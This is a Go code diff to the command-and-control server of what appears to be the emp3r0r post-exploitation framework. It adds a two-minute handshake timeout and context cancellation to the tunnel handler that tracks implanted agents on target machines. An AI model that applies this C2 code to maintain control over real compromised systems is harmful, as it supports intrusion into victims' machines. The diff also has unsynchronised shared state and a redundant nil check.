@@ -477,6 +477,9 @@ func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
 
 // msgTunHandler JSON message based (C&C) tunnel between agent and cc
 func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
+	// updated on each successful handshake
+	var last_handshake = time.Now()
+
 	// use h2conn
 	conn, err := h2conn.Accept(wrt, req)
 	if err != nil {
@@ -485,7 +488,10 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 		return
 	}
 
+	ctx, cancel := context.WithCancel(context.Background())
+
 	defer func() {
+		CliPrintDebug("msgTunHandler exiting")
 		for t, c := range Targets {
 			if c.Conn == conn {
 				delete(Targets, t)
@@ -497,10 +503,11 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 				break
 			}
 		}
-		err = conn.Close()
-		if err != nil {
-			CliPrintError("msgTunHandler failed to close connection: " + err.Error())
+		if conn != nil {
+			conn.Close()
 		}
+		cancel()
+		CliPrintDebug("msgTunHandler exited")
 	}()
 
 	// talk in json
@@ -512,42 +519,65 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 
 	// Loop forever until the client hangs the connection, in which there will be an error
 	// in the decode or encode stages.
-	for {
-		// deal with json data from agent
-		err = in.Decode(&msg)
-		if err != nil {
-			return
-		}
-		// read hello from agent, set its Conn if needed, and hello back
-		// close connection if agent is not responsive
-		if strings.HasPrefix(msg.Payload, "hello") {
-			reply_msg := msg
-			reply_msg.Payload = msg.Payload + util.RandStr(util.RandInt(1, 10))
-			err = out.Encode(reply_msg)
+	go func() {
+		defer cancel()
+		for ctx.Err() == nil {
+			// deal with json data from agent
+			err = in.Decode(&msg)
 			if err != nil {
-				CliPrintWarning("msgTunHandler cannot send hello to agent %s", msg.Tag)
 				return
 			}
+			// read hello from agent, set its Conn if needed, and hello back
+			// close connection if agent is not responsive
+			if strings.HasPrefix(msg.Payload, "hello") {
+				reply_msg := msg
+				reply_msg.Payload = msg.Payload + util.RandStr(util.RandInt(1, 10))
+				err = out.Encode(reply_msg)
+				if err != nil {
+					CliPrintWarning("msgTunHandler cannot answer hello to agent %s", msg.Tag)
+					return
+				}
+				last_handshake = time.Now()
+			}
+
+			// process json tundata from agent
+			processAgentData(&msg)
+
+			// assign this Conn to a known agent
+			agent := GetTargetFromTag(msg.Tag)
+			if agent == nil {
+				CliPrintError("%v: no agent found by this msg", msg)
+				return
+			}
+			shortname := strings.Split(agent.Tag, "-agent")[0]
+			if agent == nil {
+				CliPrintWarning("msgTunHandler: agent not recognized")
+				return
+			}
+			if Targets[agent].Conn == nil {
+				CliAlert(color.FgHiGreen, "[%d] Knock.. Knock...", Targets[agent].Index)
+				CliAlert(color.FgHiGreen, "agent %s connected", strconv.Quote(shortname))
+			}
+			Targets[agent].Conn = conn
 		}
+	}()
 
-		// process json tundata from agent
-		processAgentData(&msg)
-
-		// assign this Conn to a known agent
-		agent := GetTargetFromTag(msg.Tag)
-		if agent == nil {
-			CliPrintError("%v: no agent found by this msg", msg)
+	// wait no more than 2 min,
+	// if agent is unresponsive, kill connection and declare agent death
+	for ctx.Err() == nil {
+		since_last_handshake := time.Since(last_handshake)
+		agent_by_conn := GetTargetFromH2Conn(conn)
+		name := emp3r0r_data.Unknown
+		if agent_by_conn != nil {
+			name = strings.Split(agent_by_conn.Tag, "-agent")[0]
+		}
+		CliPrintDebug("Last handshake from agent '%s': %v ago", name, since_last_handshake)
+		if since_last_handshake > 2*time.Minute {
+			CliPrintDebug("msgTunHandler: timeout, "+
+				"hanging up agent (%v)'s C&C connection",
+				name)
 			return
 		}
-		shortname := strings.Split(agent.Tag, "-agent")[0]
-		if agent == nil {
-			CliPrintWarning("msgTunHandler: agent not recognized")
-			return
-		}
-		if Targets[agent].Conn == nil {
-			CliAlert(color.FgHiGreen, "[%d] Knock.. Knock...", Targets[agent].Index)
-			CliAlert(color.FgHiGreen, "agent %s connected", strconv.Quote(shortname))
-		}
-		Targets[agent].Conn = conn
+		util.TakeABlink()
 	}
 }
